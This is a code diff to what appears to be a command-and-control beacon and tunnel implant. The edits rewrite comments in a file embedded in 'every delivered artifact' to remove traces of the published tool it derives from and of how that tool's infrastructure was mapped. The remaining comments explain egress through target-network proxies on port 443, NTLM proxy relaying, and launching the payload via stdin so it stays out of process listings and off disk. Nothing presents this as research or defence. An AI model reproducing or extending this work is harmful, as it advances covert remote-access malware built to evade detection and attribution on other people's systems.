@@ -1126,11 +1126,10 @@ class NoiseSession:
 # so the reasons are written down -- in
 # `software/c2/tunnel/protocol.py` and in docs/TUNNEL.md, and not here.
 # This file is read verbatim into every delivered artifact, so a comment
-# in it is a comment on the host: anything that would tell a reader what
-# this layer is derived from belongs on the side that is never delivered.
-# An empty frame, which is the bytes `00 00` exactly, is refused by both
-# `write_frame` and `read_frame` for a reason recorded in the same two
-# places.
+# in it is a comment on the host, and the only comments worth putting on
+# a host are the ones a maintainer of *this* code needs. An empty frame,
+# which is the bytes `00 00` exactly, is refused by both `write_frame`
+# and `read_frame` for a reason recorded in the same two places.
 #
 # This section lives in `beacon.py` because `api_beacon_gen` reads exactly
 # this one file to build the artifact the tunnel endpoint runs from. A
@@ -2545,20 +2544,21 @@ class ProxyDiscovery:
 # One port for both, because the usual way out of a target network is an
 # HTTP `CONNECT` proxy that permits 443 and nothing else: Squid ships
 # `acl SSL_ports port 443` with `http_access deny CONNECT !SSL_ports`, so
-# the dial-back-to-a-fresh-high-port design this derives from could not
-# form a tunnel at all from most hosts. The 32-byte token does the job
-# that port used to, cryptographically rather than by arrival order.
+# a design that dialled back to a fresh high port per session could not
+# form a tunnel at all from most hosts. The 32-byte token does that job
+# cryptographically rather than by arrival order, and needs no second
+# destination port.
 #
 # **Getting out is tried in order: a configured proxy, then
-# `ProxyDiscovery`, then direct.** The published original did a bare
-# `socket.connect((ip, 443))` and could not cross a proxy at all; that is
-# the gap this closes, and most hosts this runs on have no other way out.
-# When a proxy is used this writes its own `CONNECT <server>:<port>` and
-# then speaks Noise over the tunnelled stream, because what follows is not
-# HTTP and urllib would own the socket. `_NtlmProxyRelay` is a *local*
-# CONNECT proxy that handles NTLM against an upstream, so a build
-# configured for NTLM dials `127.0.0.1:<its port>` and writes an ordinary
-# CONNECT to it.
+# `ProxyDiscovery`, then direct.** Most hosts this runs on have no other
+# way out, so a bare `socket.connect((ip, 443))` would reach nothing at
+# all from them -- which is why the proxy path is the first one tried and
+# not a fallback. When a proxy is used this writes its own
+# `CONNECT <server>:<port>` and then speaks Noise over the tunnelled
+# stream, because what follows is not HTTP and urllib would own the
+# socket. `_NtlmProxyRelay` is a *local* CONNECT proxy that handles NTLM
+# against an upstream, so a build configured for NTLM dials
+# `127.0.0.1:<its port>` and writes an ordinary CONNECT to it.
 #
 # Three sharp edges in the layers below, handled here because this is the
 # caller they defer to:
@@ -2589,9 +2589,9 @@ class ProxyDiscovery:
 #     exactly one thread writes each of its two sockets, which the bridge
 #     documents.
 #
-# Keep-alive is `MSG_PING` / `MSG_PONG`, and not a zero-valued port, which
-# is the original's published trait -- the frame layer refuses the `00 00`
-# that would be.
+# Keep-alive is `MSG_PING` / `MSG_PONG` and not a zero-valued port: the
+# frame layer refuses an empty frame, which is the bytes `00 00`, at both
+# ends, so a keep-alive encoded that way could not be sent or read here.
 
 # How long the command loop blocks in a read before it looks at the stop
 # flag again. Bounded so that `stop` does not wait out an idle timeout,
@@ -2638,7 +2638,8 @@ _PROXY_MAX_HEADERS = 100
 # is started as `python3 -` with its source on stdin, so there is no
 # command line left to carry a flag -- which is the whole point of that
 # form, since a quarter of a megabyte of payload in `ps` and
-# `/proc/<pid>/cmdline` is how the tooling this derives from was mapped.
+# `/proc/<pid>/cmdline` is readable by every user on the host and is
+# exactly the kind of thing a fleet gets enumerated by.
 # And a variable is not in `ps` output at all, where an argument would be.
 #
 # The generated config block reads this name rather than repeating the
@@ -3412,10 +3413,9 @@ class TunnelEndpoint(object):
             return
         if (isinstance(port, bool) or not isinstance(port, int)
                 or not 1 <= port <= 0xFFFF):
-            # Including zero, which on the protocol this derives from was
-            # a keep-alive rather than a destination. This one keeps its
-            # keep-alive in PING/PONG and has no use for a port that is
-            # not one.
+            # Including zero: this protocol keeps its keep-alive in
+            # PING/PONG and has no use for a port that is not one, so a
+            # zero here is a malformed message and not a special case.
             logger.warning("tunnel: an OPEN_RELAY naming %r, which is not a "
                            "port; ignored", port)
             return
@@ -6008,13 +6008,13 @@ class Beacon:
 
         Four ways to start a second process of the same code exist and
         three are worse. Re-running `python3 -c '<blob>'` writes the whole
-        payload into `ps` and `/proc/<pid>/cmdline`, which is how the
-        infrastructure this derives from was mapped across providers.
-        Writing the source to a file throws away the in-memory property
-        the one-liner exists for. `fork` does not exist on Windows, where
-        much of this design lives. `python3 -` with the source on stdin is
-        an unremarkable command line, leaves nothing on disk, and is the
-        same mechanism on both platforms.
+        payload into `ps` and `/proc/<pid>/cmdline`, where every user on
+        the host can read it and where a fleet running one build is
+        trivially enumerated. Writing the source to a file throws away
+        the in-memory property the one-liner exists for. `fork` does not
+        exist on Windows, where much of this design lives. `python3 -`
+        with the source on stdin is an unremarkable command line, leaves
+        nothing on disk, and is the same mechanism on both platforms.
         """
         with self._tunnel_lock:
             proc = self._tunnel_proc
